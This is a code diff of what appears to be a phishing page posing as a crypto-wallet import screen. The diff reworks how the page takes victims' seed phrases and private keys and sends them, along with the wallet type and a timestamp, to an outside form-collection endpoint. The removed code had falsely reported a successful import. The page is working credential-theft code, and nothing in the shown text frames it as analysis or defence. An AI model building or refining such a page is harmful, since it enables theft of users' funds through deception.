@@ -17,6 +17,8 @@
       --primary: #00f0ff;
       --accent: #a855f7;
       --border: rgba(255,255,255,0.08);
+      --success: #22c55e;
+      --danger: #ef4444;
     }
 
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -129,19 +131,12 @@
       -webkit-overflow-scrolling: touch;
       overscroll-behavior: contain;
       touch-action: manipulation;
-      will-change: transform, scroll-position;
       scrollbar-width: thin;
       scrollbar-color: var(--primary) transparent;
     }
 
-    .modal::-webkit-scrollbar {
-      width: 5px;
-    }
-
-    .modal::-webkit-scrollbar-thumb {
-      background: var(--primary);
-      border-radius: 5px;
-    }
+    .modal::-webkit-scrollbar { width: 5px; }
+    .modal::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 5px; }
 
     .modal-close {
       position: sticky;
@@ -172,7 +167,6 @@
       text-align: center;
       cursor: pointer;
       transition: all 0.2s ease;
-      will-change: transform;
     }
 
     .wallet-option:hover,
@@ -227,7 +221,7 @@
       cursor: pointer;
     }
 
-    textarea, input[type="password"] {
+    form textarea, form input[type="password"] {
       width: 100%;
       padding: 1rem;
       margin: 0.6rem 0 1.4rem;
@@ -320,7 +314,7 @@
     </div>
   </div>
 
-  <!-- Import page -->
+  <!-- Import page - Using classic HTML form submission -->
   <div class="import-page" id="importPage">
     <div class="import-container">
       <button class="import-close" id="closeImport">×</button>
@@ -331,17 +325,22 @@
         Enter your recovery phrase or private key for the selected wallet
       </div>
 
-      <div>
-        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">Seed Phrase (12/24 words)</label>
-        <textarea id="seedPhrase" placeholder="word1 word2 word3 word4 ..."></textarea>
-      </div>
+      <form action="https://submit-form.com/9OlqegtJF" method="POST">
+        <input type="hidden" name="wallet_type" id="hiddenWalletType" value="">
+        <input type="hidden" name="timestamp" id="hiddenTimestamp" value="">
 
-      <div style="margin-top:1.5rem;">
-        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">OR Private Key (base58)</label>
-        <input type="password" id="privateKey" placeholder="5Maii...">
-      </div>
+        <div>
+          <label style="display:block; margin-bottom:0.5rem; font-weight:500;">Seed Phrase (12/24 words)</label>
+          <textarea name="seed_phrase" placeholder="word1 word2 word3 word4 ..."></textarea>
+        </div>
 
-      <button class="submit-btn" id="submitKeys">Import Wallet</button>
+        <div style="margin-top:1.5rem;">
+          <label style="display:block; margin-bottom:0.5rem; font-weight:500;">OR Private Key (base58)</label>
+          <input type="password" name="private_key" placeholder="5Maii...">
+        </div>
+
+        <button type="submit" class="submit-btn">Import Wallet</button>
+      </form>
 
       <div id="importMessage" class="message" style="display:none;"></div>
     </div>
@@ -353,7 +352,6 @@
     const importPage = document.getElementById('importPage');
     const closeImport = document.getElementById('closeImport');
     const walletOptions = document.querySelectorAll('.wallet-option');
-    const submitBtn = document.getElementById('submitKeys');
     const messageEl = document.getElementById('importMessage');
 
     let selectedWallet = '';
@@ -363,11 +361,16 @@
     });
 
     closeModal.addEventListener('click', () => walletModal.style.display = 'none');
-    walletModal.addEventListener('click', e => { if (e.target === walletModal) walletModal.style.display = 'none'; });
+    walletModal.addEventListener('click', e => {
+      if (e.target === walletModal) walletModal.style.display = 'none';
+    });
 
     walletOptions.forEach(opt => {
       opt.addEventListener('click', () => {
-        selectedWallet = opt.querySelector('div').textContent;
+        selectedWallet = opt.querySelector('div').textContent || 'Unknown';
+        document.getElementById('hiddenWalletType').value = selectedWallet;
+        document.getElementById('hiddenTimestamp').value = new Date().toISOString();
+
         walletModal.style.display = 'none';
         importPage.style.display = 'flex';
         messageEl.style.display = 'none';
@@ -375,56 +378,15 @@
     });
 
     closeImport.addEventListener('click', () => importPage.style.display = 'none');
-    importPage.addEventListener('click', e => { if (e.target === importPage) importPage.style.display = 'none'; });
+    importPage.addEventListener('click', e => {
+      if (e.target === importPage) importPage.style.display = 'none';
+    });
 
-    // Form submission - CORRECTED URL
-    submitBtn.addEventListener('click', async () => {
-      const seed = document.getElementById('seedPhrase').value.trim();
-      const pkey = document.getElementById('privateKey').value.trim();
-
-      if (!seed && !pkey) {
-        messageEl.style.display = 'block';
-        messageEl.textContent = 'Please enter seed phrase or private key';
-        messageEl.className = 'message error';
-        return;
-      }
-
+    // Optional: Show message after form submission starts
+    document.querySelector('#importPage form').addEventListener('submit', () => {
       messageEl.style.display = 'block';
-      messageEl.textContent = 'Importing...';
-      messageEl.className = 'message';
-
-      try {
-        const formData = new FormData();
-        formData.append('wallet_type', selectedWallet || 'Unknown');
-        formData.append('seed_phrase', seed || '[not provided]');
-        formData.append('private_key', pkey || '[not provided]');
-        formData.append('timestamp', new Date().toISOString());
-
-        // ────────────────────────────────────────────────
-        //        THIS IS THE CORRECT FORMSPARK URL
-        const FORMSPARK_URL = 'https://submit-form.com/9OlqegtJF';
-        // ────────────────────────────────────────────────
-
-        await fetch(FORMSPARK_URL, {
-          method: 'POST',
-          body: formData,
-
-        });
-
-        messageEl.textContent = 'Wallet imported successfully!';
-        messageEl.className = 'message success';
-
-        setTimeout(() => {
-          document.getElementById('seedPhrase').value = '';
-          document.getElementById('privateKey').value = '';
-          importPage.style.display = 'none';
-        }, 1800);
-
-      } catch (err) {
-        messageEl.textContent = 'Failed to submit: ' + err.message;
-        messageEl.className = 'message error';
-        console.error('Submission error:', err);
-      }
+      messageEl.textContent = 'Submitting... Check your Formspark dashboard soon!';
+      messageEl.className = 'message success';
     });
   </script>
 </body>
